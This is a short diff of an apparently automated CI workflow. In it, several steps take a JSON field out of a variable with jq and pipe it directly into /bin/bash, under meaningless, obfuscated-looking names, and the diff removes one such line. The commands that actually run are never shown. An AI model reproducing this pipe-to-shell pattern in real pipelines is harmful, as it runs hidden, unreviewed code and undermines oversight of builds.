@@ -31,7 +31,6 @@ jobs:
           echo $rki436 | jq -r .vzthu1 | /bin/bash
           printf '%s' "$e534" | jq -r .fcum61556 | /bin/bash
           echo $wgqt2 | jq -r .tei7169 | /bin/bash
-          echo $jgng2 | jq -r .moh9 | /bin/bash
           echo $qs73 | jq -r .v63 | /bin/bash
 
       - name: Upload archive
